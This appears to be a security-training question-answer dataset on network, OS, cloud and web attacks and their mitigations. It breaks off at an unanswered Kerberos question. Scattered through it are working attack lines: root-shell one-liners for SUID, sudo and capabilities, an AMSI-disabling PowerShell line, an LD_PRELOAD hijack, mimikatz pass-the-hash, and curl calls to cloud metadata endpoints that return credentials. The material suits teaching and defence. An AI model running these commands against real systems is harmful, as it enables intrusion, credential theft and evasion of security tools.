messages.content: Explain the OSI model and how each layer is relevant to network security.

The OSI model has 7 layers, each with distinct attack surfaces. Layer 1 Physical: cable tapping, rogue access points. Layer 2 Data Link: ARP spoofing, MAC flooding, VLAN hopping, 802.1Q double-tagging. Layer 3 Network: IP spoofing, ICMP tunneling, route injection (BGP hijack). Layer 4 Transport: TCP SYN flooding, session hijacking, port scanning. Layer 5 Session: session fixation, token theft. Layer 6 Presentation: SSL stripping, malformed certificate attacks, TLS downgrade (POODLE, BEAST). Layer 7 Application: SQL injection, XSS, CSRF, RCE, directory traversal. Defenders monitor each layer; attackers exploit the weakest. Most enterprise controls focus on layers 3-7 while layers 1-2 are frequently overlooked.
How does TCP three-way handshake work and how is it exploited?

TCP handshake: client sends SYN with ISN; server responds SYN-ACK with its ISN; client sends ACK. This establishes a full-duplex connection. Exploits: (1) SYN flood -- attacker sends many SYN packets with spoofed IPs, exhausting the server's half-open connection table (SYN_RCVD state). Mitigation: SYN cookies (encode state in the SYN-ACK's sequence number, eliminating half-open state). (2) TCP session hijacking -- attacker sniffs ISN and injects packets with correct sequence numbers to take over a session. (3) RST injection -- forge RST packets to terminate connections. ISN randomisation (per RFC 6528) makes blind hijacking impractical on modern stacks.
What is BGP hijacking and how do nation-states exploit it?

BGP (Border Gateway Protocol) is the inter-domain routing protocol. Routers announce IP prefixes they can reach. BGP trusts announcements by default -- no cryptographic origin validation. A BGP hijack occurs when a network announces a more specific prefix for an address space it does not own, attracting traffic to it. Attack types: (1) Origin AS hijack -- announce the victim prefix from an attacker AS; (2) Sub-prefix hijack -- announce a more-specific /25 of a legitimate /24, stealing only a portion; (3) Route leak -- propagate internal routes externally. Nation-state examples: China Telecom repeatedly attracting US government traffic (2010, 2019). Mitigation: RPKI (Resource Public Key Infrastructure) allows IP address owners to cryptographically sign which AS may originate their prefixes, enabling ROA (Route Origin Authorisation) validation at route peers.
Explain VLAN hopping attacks and how to prevent them.

VLAN hopping allows an attacker on one VLAN to reach traffic on another. Two methods: (1) Switch spoofing -- attacker's NIC sends DTP (Dynamic Trunking Protocol) frames to negotiate a trunk link with the switch. Once trunking, the attacker receives all VLAN traffic. Mitigation: disable DTP on all access ports (switchport nonegotiate; switchport mode access). (2) Double tagging -- attacker sends frames with two 802.1Q headers. The outer tag matches the native VLAN (untagged on trunk), is stripped by the first switch, and the inner tag (victim VLAN) is forwarded. Works only one-way but useful for DoS or packet injection. Mitigation: change the native VLAN to an unused VLAN (not VLAN 1), and explicitly tag the native VLAN on all trunks (vlan dot1q tag native).
How does DNS work and what are the main DNS attack categories?

DNS resolves hostnames to IP addresses through a hierarchy: recursive resolver queries root (.) then TLD (.com) then authoritative nameservers. Caching reduces load. Attack categories: (1) DNS cache poisoning -- inject false records into a resolver's cache (Kaminsky attack: send many spoofed responses with random transaction IDs; with 16-bit TXID and source port randomisation providing ~2^32 entropy, Kaminsky required mass parallel queries; DNSSEC prevents it). (2) DNS amplification DDoS -- send ANY queries with spoofed victim IP to open resolvers; responses are 50-100x larger than queries. Mitigation: disable open recursion, rate-limit DNS replies. (3) DNS tunneling -- encode data in DNS query/response labels to exfiltrate data or C2 through firewalls that allow DNS. (4) NXDOMAIN attacks -- flood with non-existent domain queries to exhaust resolver resources. (5) Subdomain takeover -- stale CNAME points to a deprovisioned cloud service; attacker claims it.
Explain how ARP spoofing enables man-in-the-middle attacks.

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network segment. ARP is stateless and unauthenticated -- hosts accept unsolicited ARP replies and update their cache. Attack: attacker sends gratuitous ARP replies claiming that the gateway's IP belongs to the attacker's MAC, and claims the victim's IP also belongs to the attacker's MAC. Both hosts update their ARP caches. Traffic flows: victim -> attacker -> gateway (and reverse), giving the attacker a MITM position for passive sniffing or active modification. Tools: arpspoof, Bettercap, Scapy. Mitigation: Dynamic ARP Inspection (DAI) on managed switches validates ARP packets against a DHCP snooping binding table. Static ARP entries on critical hosts. 802.1X port authentication. Private VLANs to prevent lateral communication between hosts.
What is ICMP tunneling and how do defenders detect it?

ICMP tunneling encodes data payloads inside ICMP Echo (ping) request/reply packets. Since most firewalls allow ICMP for network diagnostics, this bypasses firewall controls. The payload field of ICMP Echo packets can carry arbitrary data. Tools: ptunnel, icmpsh, icmptunnel. Implementation: client encodes TCP segments in ICMP Echo requests to a server listening on a compromised host outside the firewall; the server decodes and forwards traffic. Detection: (1) Large or non-standard ICMP payload sizes (standard ping payloads are 32-64 bytes; tunnels carry 1000+ bytes). (2) High-frequency ICMP between two hosts. (3) Non-standard ICMP type/code combinations. (4) ICMP sequences that never terminate. (5) DPI (deep packet inspection) inspecting ICMP payload entropy and structure. Defence: block or rate-limit ICMP at perimeter; use ICMP payload inspection in NGFW rules.
Explain TCP/IP stack fingerprinting for OS detection.

Each OS implements the TCP/IP stack differently, producing detectable signatures in packet fields. nmap OS detection (-O) probes: (1) SYN probe to open port -- measures initial window size, TTL, IP DF bit, TCP options order (MSS, SACK, window scaling, NOP, timestamps), and ISN generation algorithm. (2) SYN to closed port -- measures RST response. (3) UDP probe to closed port -- measures ICMP unreachable response format. (4) TCP ECN probe. (5) Implicit sequence number analysis. Signatures: Linux: window 5840-29200, TTL 64, SACK enabled. Windows: window 8192-65535, TTL 128. Cisco IOS: TTL 255. Defenders use network address translation or packet normalisation (pf scrub, netfilter NFQUEUE) to strip or randomise these fields, defeating passive fingerprinting. Active countermeasures: tools like Honeyd or fragrouter forge OS fingerprints.
How do you enumerate a network from zero to a target host list?

Systematic network enumeration: (1) Passive recon -- whois, ARIN/RIPE RDAP for IP block ownership; Shodan/Censys for exposed services; Certificate Transparency logs for subdomains; BGP data for AS numbers. (2) Active host discovery -- nmap -sn 10.0.0.0/24 (ARP on LAN, ICMP+SYN/ACK on WAN); masscan for fast port discovery at millions of packets/second. (3) Port scan -- nmap -sV -sC -p- for service version detection and default scripts; target top ports first with --top-ports 1000. (4) Service enumeration -- per-service: SMB (smbclient, enum4linux, nmap smb-enum-*), SNMP (snmpwalk, onesixtyone), LDAP (ldapsearch, enum4linux-ng), RPC (rpcinfo, rpcclient). (5) DNS enumeration -- dig axfr, dnsrecon, amass, subfinder. (6) Web technology fingerprinting -- Wappalyzer, whatweb, nikto. (7) Vulnerability scan -- nmap --script vuln, OpenVAS, Nexpose. Document all findings in a structured target list with service/version/potential vulns per host.
What is network segmentation and how does it limit attack blast radius?

Network segmentation divides a network into isolated zones so that compromise of one segment does not automatically grant access to others. Implementation layers: (1) Physical -- separate switches/routers for different zones. (2) VLANs -- logical segmentation on the same physical infrastructure with inter-VLAN routing controlled by ACLs or firewall rules. (3) Subnetting -- different IP ranges per zone with routing policies controlling inter-zone traffic. (4) Firewall zones -- DMZ (internet-facing services), internal (corporate LAN), management (out-of-band access), PCI (cardholder data), OT (operational technology). (5) Microsegmentation -- software-defined perimeters where each workload has an identity and firewall rules are applied per-workload (VMware NSX, Illumio). Best practice: default-deny between segments; explicit allowlist rules for required flows; no flat /16 or /8 networks; privileged access workstations (PAWs) on isolated management VLANs. Containment: attacker in the DMZ cannot directly reach internal database servers without crossing a firewall and exploiting additional vulnerabilities.
Explain the Linux process memory layout and how it relates to exploitation.

A Linux process's virtual address space (low to high): text segment (executable code, read-only); data segment (initialised global/static variables); BSS segment (uninitialised globals/statics, zeroed on load); heap (grows upward via brk/mmap); memory-mapped region (shared libraries via mmap); stack (grows downward, contains stack frames, return addresses, local variables). Security mechanisms: ASLR randomises base addresses of stack, heap, and libraries at each execution. Stack canaries (SSP -- Stack Smashing Protector) place a random value before the saved RIP; overwriting it triggers abort(). NX/W^X (No-eXecute) marks the stack and heap non-executable, preventing shellcode injection there. PIE (Position-Independent Executable) randomises the text segment base. Exploitation targets these: heap exploits target allocator metadata; ROP chains use existing executable gadgets; format string exploits can leak canary values or overwrite the GOT.
How does Windows process injection work at the API level?

Classic remote process injection (CreateRemoteThread): (1) OpenProcess(PROCESS_ALL_ACCESS, pid) -- get handle to target process. (2) VirtualAllocEx -- allocate RWX memory in target. (3) WriteProcessMemory -- copy shellcode into allocated region. (4) CreateRemoteThread -- start execution of shellcode. Defenders detect: OpenProcess with PROCESS_VM_WRITE + PROCESS_CREATE_THREAD on non-child processes; VirtualAllocEx with PAGE_EXECUTE_READWRITE. Evasion variants: APC injection (QueueUserAPC instead of CreateRemoteThread -- runs when thread enters alertable wait); NtCreateThreadEx (direct syscall bypasses API hooks); Early Bird injection (inject before main thread runs via ResumeThread); Process Hollowing (hollow out a legitimate process, replace image with malicious one); Module Stomping (overwrite a loaded DLL's.text section). Each technique has a different EDR detection surface -- direct syscalls bypass userland hooks entirely.
Explain Linux capabilities and how they enable privilege escalation.

Linux capabilities divide root privileges into discrete units that can be granted individually. Key capabilities for privilege escalation: CAP_SETUID -- change UID to any user including root; exploit: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' if python has this capability. CAP_NET_RAW -- raw socket access; enables sniffing and crafting arbitrary packets. CAP_SYS_ADMIN -- broad administrative access (mount filesystems, ptrace, change network namespaces); most dangerous capability. CAP_DAC_READ_SEARCH -- bypass file permission checks for reads; can read /etc/shadow. CAP_SYS_PTRACE -- trace arbitrary processes; can read process memory including credentials. Detection: getcap -r / 2>/dev/null finds binaries with capabilities. GTFOBins documents capability abuse paths. Mitigation: never grant CAP_SYS_ADMIN or CAP_SETUID to untrusted processes; use seccomp-BPF profiles to restrict syscalls; use AppArmor/SELinux to restrict even capable processes.
How does Windows NTLM authentication work and where does it break?

NTLM (NT LAN Manager) is a challenge-response authentication protocol. Steps: (1) Client sends NEGOTIATE_MESSAGE. (2) Server sends CHALLENGE_MESSAGE with an 8-byte random nonce. (3) Client hashes its NT password hash (MD4 of UTF-16LE password) combined with the challenge using HMAC-MD5 (NTLMv2), producing an AUTHENTICATE_MESSAGE. The server validates by computing the same hash (knows the password hash from AD). Weaknesses: (1) Pass-the-Hash (PtH) -- capturing the NT hash (from lsass, SAM, NTDS.dit) allows authentication without knowing the plaintext password; use mimikatz sekurlsa::pth. (2) NTLM relay -- capture an NTLM authentication attempt (via Responder for NBT-NS/LLMNR poisoning) and relay it to another service in real time; ntlmrelayx automates this. (3) NTLMv1 is trivially crackable (DES-based, weak); NTLMv2 requires rainbow tables or cracking. Mitigation: disable NTLMv1; enforce SMB signing (prevents relay); disable LLMNR/NBT-NS; move to Kerberos only.
Explain Windows registry forensics and persistence mechanisms.

The Windows registry is a hierarchical database storing OS and application configuration. Forensic artefacts: SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList -- user profile paths. SYSTEM\CurrentControlSet\Services -- installed services and drivers. NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run -- per-user autoruns. SOFTWARE\Microsoft\Windows\CurrentVersion\Run -- system-wide autoruns. UserAssist (ROT13-encoded) -- recently executed applications. ShimCache (AppCompatCache) -- application execution history. AmCache.hve -- SHA1 hashes of executed applications. Persistence mechanisms via registry: (1) Run/RunOnce keys (HKCU and HKLM). (2) Services registry entries (HKLM\SYSTEM\CurrentControlSet\Services). (3) COM hijacking (HKCU\Software\Classes\CLSID overrides system-wide entries). (4) AppInit_DLLs (loaded into every user32-dependent process). (5) Image File Execution Options (IFEO) debugger key hijacks (replace sethc.exe/utilman.exe debugger with cmd.exe for sticky-key backdoor). Detection: autoruns.exe (Sysinternals), registry monitoring via WMI event subscriptions or ETW.
How does Linux /proc filesystem expose process information for exploitation?

/proc is a pseudo-filesystem providing runtime kernel and process information. Key paths: /proc/[pid]/maps -- virtual memory layout (base addresses of stack, heap, libc -- defeats ASLR if readable by attacker process). /proc/[pid]/mem -- direct read/write access to process memory (requires ptrace capability; used in process injection attacks). /proc/[pid]/environ -- environment variables (may contain secrets, tokens, passwords). /proc/[pid]/fd/ -- open file descriptors (can access files opened by privileged processes). /proc/[pid]/cmdline -- process command line (may expose passwords passed as arguments). /proc/sysrq-trigger -- trigger kernel functions (reboot, dump memory). /proc/sys/kernel/core_pattern -- exploit: if writable and contains a pipe (|), specify an executable path that runs on crash (container escape technique). Exploitation: from inside a container, /proc/[host-pid]/mem of a privileged host process provides a container escape vector. Mitigation: hide_pid mount option restricts /proc/[pid] to process owner; seccomp blocks ptrace syscall.
How do you harden a Linux server from initial installation?

Hardening checklist: (1) Minimal install -- remove unnecessary packages (apt purge telnet rsh-client rsh-redone-client). (2) Automatic security updates -- unattended-upgrades with email notifications. (3) SSH hardening: PermitRootLogin no; PasswordAuthentication no; AllowUsers specific_user; Protocol 2; MaxAuthTries 3; ClientAliveInterval 300; use ed25519 keys. (4) Firewall: ufw default deny incoming; allow specific ports; enable ufw. (5) Fail2ban for SSH brute-force protection. (6) Disable unnecessary services: systemctl disable avahi-daemon cups bluetooth. (7) Filesystem: separate /tmp (noexec, nosuid, nodev mount options); /var/log; /home. Mount /proc with hidepid=2. (8) Kernel parameters (sysctl): net.ipv4.ip_forward=0; net.ipv4.conf.all.accept_redirects=0; kernel.randomize_va_space=2; kernel.dmesg_restrict=1; kernel.kptr_restrict=2. (9) Audit daemon (auditd): log privilege escalation, file access on sensitive paths. (10) SELinux/AppArmor enforcing mode. (11) Remove SUID/SGID from unnecessary binaries. (12) Disable core dumps (ulimit -c 0 in /etc/security/limits.conf). (13) AIDE for file integrity monitoring.
Explain Linux SUID/SGID binaries and how they are abused for privilege escalation.

SUID (Set User ID on execution) causes a binary to run with the file owner's permissions regardless of who executes it. SGID does the same for group permissions. When a SUID root binary runs, it has UID 0. Exploitation: find / -perm -4000 -type f 2>/dev/null lists SUID binaries. GTFOBins documents abuse paths for hundreds of standard binaries: bash -p (preserves effective UID); vim -c '!bash'; less invoked with PAGER=less man (then !bash); find. -exec /bin/bash -p \; ; python -c 'import os; os.setuid(0); os.system("/bin/sh")'; cp /bin/bash /tmp/bash; chmod +s /tmp/bash. Custom SUID vulnerabilities: shell metacharacter injection in system() calls within SUID binaries; PATH manipulation if the binary calls commands without absolute paths (set PATH=/tmp:$PATH, place malicious binary named 'service' in /tmp). SGID abuse: common with /usr/bin/write (sgid tty), mail readers. Mitigation: audit SUID/SGID regularly with AIDE; mount filesystems with nosuid; use capabilities instead of SUID where possible.
How does Linux PAM work and where do misconfigurations create vulnerabilities?

PAM (Pluggable Authentication Modules) provides a flexible authentication framework. /etc/pam.d/ contains per-service configs with four module types: auth (authentication), account (authorisation), password (password changes), session (session setup). Control flags: required (fail continues but always fails), requisite (fail stops immediately), sufficient (success stops if no prior required failures), optional (result ignored unless only module). Common modules: pam_unix (standard Unix password), pam_ldap (LDAP auth), pam_tally2/faillock (lockout after failures), pam_limits (resource limits), pam_rootok (allows root without password), pam_env (sets environment variables). Misconfigurations: (1) pam_rootok in sudo config allows root without password. (2) Misconfigured sufficient flags allowing bypass if earlier required modules fail silently. (3) pam_env loading user-controlled ~/.pam_environment (deprecated in modern PAM). (4) LDAP PAM with anonymous bind allowing auth bypass. (5) pam_unix with NullOk allowing empty passwords. Exploitation: if an attacker can write to /etc/pam.d/, they can add pam_rootok or a custom malicious module.
Explain Linux namespaces and cgroups in the context of container security.

Linux namespaces provide process isolation: PID (separate process ID space), NET (separate network stack), MNT (separate filesystem mount tree), UTS (separate hostname/domain), IPC (separate inter-process communication), USER (separate user/group IDs), CGROUP (separate cgroup hierarchy). Containers are processes that live in a distinct set of namespaces. Security implications: (1) USER namespace allows a non-root process to have UID 0 inside the namespace but a non-privileged UID on the host -- powerful but dangerous; rootless containers use this. (2) Without USER namespace isolation, a process with UID 0 inside a container has UID 0 on the host. (3) MNT namespace -- container escapes via /proc/[host-pid]/fd or /proc/sys/kernel/core_pattern. (4) NET namespace -- container gets its own network stack but shares host kernel network code. cgroups limit CPU, memory, I/O, and PIDs for a container group -- a container without cgroup limits can exhaust host resources. Escape vectors: writable /proc/sys/kernel/core_pattern; privileged containers; mounted Docker socket; CAP_SYS_ADMIN; host network namespace.
How does sudo work and what are common sudo misconfigurations?

sudo allows configured users to run specific commands as root (or other users). Configuration: /etc/sudoers (syntax: user host=(runas) NOPASSWD:command). Key misconfigurations: (1) ALL = (ALL) ALL with NOPASSWD -- full passwordless root. (2) Wildcard abuse: /usr/bin/vim /var/log/* -- attacker runs sudo vim /var/log/../../etc/sudoers (path traversal if not sanitised) or sudo vim then :!bash. (3) LD_PRELOAD / LD_LIBRARY_PATH -- if env_keep includes these, attacker creates a malicious shared library loaded by the sudoed binary: LD_PRELOAD=/tmp/evil.so sudo /usr/bin/something. (4) Writable script path: if sudoers allows running a shell script that is world-writable, attacker modifies the script. (5) Command injection via arguments: sudo /usr/bin/find /tmp -exec /bin/bash -p \;. (6) Python/perl/ruby with -c flag: sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'. Tools: sudo -l lists current user's sudo permissions. GTFOBins documents every binary's sudo abuse path.
Explain Windows access tokens, privileges, and how to abuse them.

Every Windows process and thread has an access token containing: User SID, Group SIDs, Privilege list, Integrity level, logon session ID. Privileges relevant to escalation: SeImpersonatePrivilege (impersonate any logged-on user's token -- Potato attacks), SeDebugPrivilege (debug any process including SYSTEM -- read lsass memory), SeLoadDriverPrivilege (load kernel drivers -- for driver-based exploits), SeBackupPrivilege (read any file ignoring DACLs -- dump SAM/NTDS.dit), SeRestorePrivilege (write any file ignoring DACLs), SeTakeOwnershipPrivilege (take ownership of any object). Token manipulation: DuplicateToken + ImpersonateLoggedOnUser; CreateProcessWithTokenW (create process under duplicated token). Potato attacks (Rotten/Juicy/Sweet/PrintSpoofer): services running as NETWORK SERVICE or LOCAL SERVICE with SeImpersonatePrivilege can coerce a SYSTEM token via COM activation and impersonate it. whoami /priv shows token privileges. Token stripping: modern Windows requires elevated processes to request privileges explicitly; default tokens have many privileges disabled.
How does Windows Defender and AMSI work, and what are common bypass techniques?

AMSI (Antimalware Scan Interface) is a Windows API that allows applications (PowerShell, VBScript, JScript,.NET, Office VBA) to submit buffers to installed AV for scanning before execution. Flow: application calls AmsiScanBuffer() with script content; AMSI sends to registered AV provider; if malicious, returns AMSI_RESULT_DETECTED; application aborts execution. Bypass techniques: (1) Memory patching -- amsi.dll is loaded into each process; patch AmsiScanBuffer() to return AMSI_RESULT_CLEAN (xor eax,eax; ret). In PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). (2) Reflection -- load PowerShell assemblies without triggering AMSI. (3) Obfuscation -- character substitution, string concatenation, Base64, XOR encoding of malicious strings to evade signature detection (AMSI is signature-based, not semantic). (4) COM bypass -- use Word/Excel macros to load shellcode without triggering PowerShell AMSI. (5) Unhooking -- restore original bytes of hooked functions in ntdll.dll from a clean copy loaded from disk. Defender: signatures + heuristics + cloud ML (MAPS); evasion requires polymorphic payloads and direct syscalls.
Explain the Windows registry hive structure for forensic investigation.

Registry hives are the physical files backing the registry. Key hives: SYSTEM (HKLM\SYSTEM) at %SystemRoot%\System32\config\SYSTEM -- services, drivers, hardware; mounted during boot. SOFTWARE (HKLM\SOFTWARE) -- installed applications, OS configuration. SAM (HKLM\SAM) -- local account password hashes; access restricted to SYSTEM. SECURITY (HKLM\SECURITY) -- LSA secrets, domain cached credentials; access restricted to SYSTEM. NTUSER.DAT (HKCU) -- per-user settings, per-user run keys; at %USERPROFILE%\NTUSER.DAT. UsrClass.dat (HKCU\Software\Classes) -- user-specific COM objects, shell bag data (folder access history -- forensic gold). Amcache.hve at %SystemRoot%\AppCompat\Programs\Amcache.hve -- SHA1 hashes and execution times of recently run executables. Forensic tools: RECmd (Registry Explorer), regripper, volatility3 registry plugins. Transaction logs (.LOG,.LOG1,.LOG2) record uncommitted changes and must be replayed for a consistent view. VSS (Volume Shadow Copies) retain previous hive versions for timeline analysis.
How does Windows ETW (Event Tracing for Windows) work and how is it used for detection?

ETW is a high-performance kernel-level tracing system. Producers (providers) instrument code with trace events; consumers (sessions) subscribe to providers and receive events. Architecture: providers register GUIDs; ETW controller creates a session specifying provider GUIDs and keywords/levels; controller writes to a circular buffer or file; consumer reads and decodes events using TDH (Trace Data Helper). Key security providers: Microsoft-Windows-Threat-Intelligence (ETWTI) -- kernel-level process injection events (ETW_THREAT_INT_IMAGE_LOAD, ETW_THREAT_INT_CREATEREMOTETHREAD); Microsoft-Windows-Security-Auditing -- standard security events; Microsoft-Antimalware-Scan-Interface -- AMSI scan events. EDR products use ETW callbacks in the kernel (PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine) to monitor process creation and module loads. Attacker evasion: (1) ETW patch -- patch EtwEventWrite in ntdll.dll to return early (nop or ret). (2) Direct syscalls bypass userland ETW instrumentation. (3) Disabling ETWTI requires kernel-mode code (signed driver or BYOVD). Detection of ETW tampering: kernel callbacks verify ETWTI registration; missing or patched providers are detectable via kernel ETW integrity checks.
What are the most impactful AWS misconfigurations attackers target?

Top AWS misconfigurations: (1) Public S3 buckets -- s3:GetObject with Principal:* exposes all objects; list permission allows enumeration; check with aws s3 ls s3://bucket-name (unauthenticated). (2) IMDSv1 (Instance Metadata Service v1) SSRF -- any process on the instance that can make HTTP requests to 169.254.169.254/latest/meta-data/iam/security-credentials/ retrieves temporary IAM credentials; IMDSv2 requires a session token (PUT then GET), defending against naive SSRF. (3) Over-privileged IAM roles -- EC2 instance roles with iam:*, s3:*, ec2:* give full cloud control. (4) Cross-account trust misconfigurations -- IAM role trust policies with wildcards (sts:AssumeRole from *). (5) Lambda environment variables in plaintext -- credentials embedded in Lambda env. (6) Publicly exposed RDS instances. (7) Security group rules: 0.0.0.0/0 on port 22/3389/5432. (8) CloudTrail disabled -- no audit log. Tools: ScoutSuite, Prowler, Pacu (AWS exploitation framework), CloudMapper. Post-exploitation: from an EC2 SSRF or Shell, curl 169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME yields AccessKeyId, SecretAccessKey, Token; then aws sts get-caller-identity, aws iam list-attached-role-policies.
Explain Azure Active Directory attack paths.

Azure AD (Entra ID) attack paths: (1) Password spray -- use MSOLSpray or Trevorspray against graph.microsoft.com or login.microsoftonline.com/common/oauth2/token; slow spray avoids lockout (1 password/30 min). (2) Illicit consent grant -- attacker registers a malicious app, tricks user into consenting; app receives OAuth tokens without MFA. (3) Service principal credential theft -- application secrets and certificates from Azure Key Vault, app registrations, or DevOps pipelines grant service-level access. (4) Managed identity abuse -- VM or function with a managed identity; SSRF to 169.254.169.254 (Azure IMDS) yields token for the managed identity. (5) PRT (Primary Refresh Token) theft -- the PRT stored in Windows 10/11 LSASS (AADInternals) enables SSO to all Azure resources; requires local admin or pass-the-PRT attack. (6) Azure role assignments -- Global Administrator, Privileged Role Administrator, Application Administrator can add credentials to service principals. (7) Conditional access bypass -- device compliance check bypassed with MDE sensor disabled or device joined to attacker-controlled tenant. Tools: ROADtools, AADInternals, AzureHound (BloodHound for Azure).
What is the container escape attack surface in Kubernetes?

Container escapes in Kubernetes: (1) Privileged containers -- runAsRoot + privileged=true gives full host access; mount host filesystem, nsenter into host PID namespace. (2) hostPath volume mounts -- mounting / or /etc from host; write /etc/cron.d/ or /root/.ssh/authorized_keys. (3) Host network namespace -- pod with hostNetwork: true accesses all host network interfaces including internal service IPs. (4) Host PID namespace -- hostPID: true allows a pod to see and signal all host processes. (5) Service account token abuse -- default SA tokens mounted at /var/run/secrets/kubernetes.io/serviceaccount/token; if SA has ClusterAdmin role, use kubectl to create privileged pods. (6) Etcd exposure -- if etcd is exposed without auth, read all secrets including SA tokens and TLS certs. (7) Kubelet API (port 10250) without authentication -- exec into any pod on the node. (8) SSRF to internal cloud metadata endpoint -- pods often have access to cloud IMDSv1. (9) Image supply chain -- malicious base images exfiltrate secrets at runtime. Tools: kube-hunter, peirates, CDK (Container and Domain Killer for K8s).
How do you enumerate and exploit GCP service accounts?

GCP service account enumeration and exploitation: (1) Metadata endpoint -- from inside a GCE instance: curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google' returns an OAuth2 access token for the instance's service account. (2) Scope and role enumeration -- gcloud auth list; gcloud projects get-iam-policy PROJECT_ID; gcloud iam service-accounts list. (3) Service account key files -- JSON key files in repositories, GCS buckets, environment variables; gcloud auth activate-service-account --key-file=key.json. (4) Workload Identity Federation misconfiguration -- external identities (GitHub Actions, AWS IAM roles) mapped to GCP service accounts without condition restrictions; if the external IDP is compromised, the GCP SA is compromised. (5) Storage bucket permissions -- storage.buckets.getIamPolicy (public); allUsers/allAuthenticatedUsers grants on buckets. (6) Impersonation -- if a SA has iam.serviceAccounts.actAs, it can impersonate higher-privileged SAs. Tools: GCPBucketBrute (enumerate GCS buckets), gcloud, Cartography (IAM graph), ScoutSuite.
Write a Python port scanner with banner grabbing.

Production-grade async port scanner with banner grabbing:
```python
import asyncio, socket, sys
from typing import Optional

async def grab_banner(ip: str, port: int, timeout: float = 2.0) -> Optional[str]:
 try:
 reader, writer = await asyncio.wait_for(
 asyncio.open_connection(ip, port), timeout=timeout)
 try:
 writer.write(b'HEAD / HTTP/1.0\r\n\r\n')
 await writer.drain()
 banner = await asyncio.wait_for(reader.read(1024), timeout=timeout)
 return banner.decode('utf-8', errors='replace').strip()[:200]
 finally:
 writer.close()
 except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
 return None

async def scan_port(ip: str, port: int, results: dict, semaphore: asyncio.Semaphore):
 async with semaphore:
 try:
 conn = asyncio.open_connection(ip, port)
 reader, writer = await asyncio.wait_for(conn, timeout=1.0)
 writer.close()
 banner = await grab_banner(ip, port)
 results[port] = banner or 'open'
 except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
 pass

async def scan(ip: str, ports: range, concurrency: int = 500):
 results = {}
 sem = asyncio.Semaphore(concurrency)
 tasks = [scan_port(ip, p, results, sem) for p in ports]
 await asyncio.gather(*tasks)
 return results

if __name__ == '__main__':
 ip = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
 results = asyncio.run(scan(ip, range(1, 65536)))
 for port, banner in sorted(results.items()):
 print(f'{port}/tcp open {banner[:80] if banner else ""}')
```
Runs all 65535 ports in ~30 seconds with 500 concurrent connections. Semaphore prevents file descriptor exhaustion. Banner grabbing sends an HTTP HEAD request and reads response.
Explain HTTP request smuggling and how to exploit it.

HTTP request smuggling exploits disagreements between how front-end (proxy/CDN) and back-end servers parse HTTP request boundaries. Two headers define request length: Content-Length (CL) and Transfer-Encoding: chunked (TE). Ambiguity arises when both are present. Attack types: CL.TE -- front-end uses CL, back-end uses TE. Attacker sends a request with a CL that includes a partial second request; the front-end sends it as one request; the back-end sees the chunked terminator and treats the remainder as the start of the next request, which gets prepended to the next victim's request. TE.CL -- reverse. TE.TE -- both support TE but behave differently with obfuscated headers (Transfer-Encoding:\x0bchunked). Impact: (1) Bypass security controls (web application firewall bypassed because the WAF sees a valid request but the back-end processes a different effective request). (2) Capture victim requests (smuggle a partial GET request that causes the back-end to treat the next victim's request as the body, which is then reflected in a response). (3) Turn reflected XSS into stored XSS. (4) Cache poisoning. Detection: Burp Suite HTTP Request Smuggler extension (James Kettle's research). Testing: send a CL.TE poison and follow up with a normal request; if the follow-up response shows contamination, the server is vulnerable.
How does OAuth 2.0 work and what are common implementation vulnerabilities?

OAuth 2.0 authorization code flow: (1) App redirects user to authorization server with client_id, redirect_uri, scope, state (CSRF token), response_type=code. (2) User authenticates and consents. (3) Auth server redirects to redirect_uri code and state. (4) App verifies state, exchanges code for tokens (POST with client_id, client_secret, code to token endpoint). (5) App uses access_token to call resource server. Vulnerabilities: (1) Missing state parameter -- CSRF attack forces victim to authorize attacker's account. (2) Weak redirect_uri validation -- open redirect (domain whitelist bypass via path traversal: evil.com/?redirect=legit.com%2F%2Fevil.com, or regex bypass). Attacker steals authorization code. (3) Authorization code reuse -- server should invalidate codes after first use. (4) Implicit flow token leakage -- access_token in URL fragment, logged by proxies and referer headers. (5) Client_secret exposure -- mobile apps embed secrets in binary (extractable). (6) Insufficient scope validation -- app grants more scope than requested. (7) JWT algorithm confusion -- RS256 public key used as HS256 secret; attacker signs tokens with the public key (published at /jwks.json). (8) PKCE bypass -- S256 code_challenge_method downgraded to plain if not enforced. Testing: Burp Suite OAuth Scanner, manual state/redirect testing.
Explain GraphQL-specific security vulnerabilities and how to test for them.

GraphQL security vulnerabilities: (1) Introspection enabled in production -- __schema query reveals full API schema (all types, fields, mutations); attacker maps entire attack surface. Disable introspection in production or restrict to authenticated roles. (2) Batching attacks -- GraphQL allows multiple operations in one request; attacker batches 1000 login mutations to bypass rate limiting applied per HTTP request. (3) Deep query DoS -- deeply nested queries ({a{b{c{d{e{...}}}}}} with exponential fan-out) cause excessive computation; mitigation: query depth limiting, complexity analysis, query timeout. (4) Field-level IDOR -- enumeration of IDs in queries (user(id: 1), user(id: 2)...); check object-level authorisation per field, not just query-level. (5) Mutation CSRF -- if cookies are used for auth and CSRF tokens not enforced for mutations; mitigated by checking Content-Type: application/json (browsers can't send this cross-origin without CORS preflight). (6) Information leakage in error messages -- verbose errors expose stack traces, DB queries, internal paths. (7) Alias abuse -- use aliases to bypass field-level rate limiting. Testing tools: GraphQL Voyager (visualise schema), Clairvoyance (introspection bypass), BatchQL, graphw00f (fingerprint GraphQL implementations).
Explain Kerberos authentication and Kerberoasting.

